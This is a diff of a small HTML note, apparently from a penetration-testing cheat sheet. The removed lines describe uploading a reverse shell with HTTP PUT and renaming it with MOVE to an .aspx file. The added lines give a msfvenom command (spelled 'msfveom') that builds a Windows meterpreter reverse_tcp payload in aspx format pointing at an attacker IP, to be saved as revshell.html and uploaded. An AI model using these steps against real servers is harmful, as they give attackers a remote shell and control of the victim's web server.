@@ -2,14 +2,9 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>HTTP Verb/Method</title>
-</head><body>PUT --&gt; upload a file/reverse shell<br/>
+<title>web payload</title>
+</head><body>ASP.NET (asp, aspx, aspx-exe)<br/>
 <br/>
+msfveom -p windows/meterpreter/reverse_tcp LHOST=&lt;attacker ip&gt; LPORT=&lt;port&gt; -f aspx<br/>
 <br/>
-body= file content<br/>
-<br/>
-<br/>
-MOVE /shell.html HTTP/1.1<br/>
-Destination: shell.aspx<br/>
-<br/>
-</body></html>
+save to <b>revshell.html</b>&nbsp;and upload</body></html>
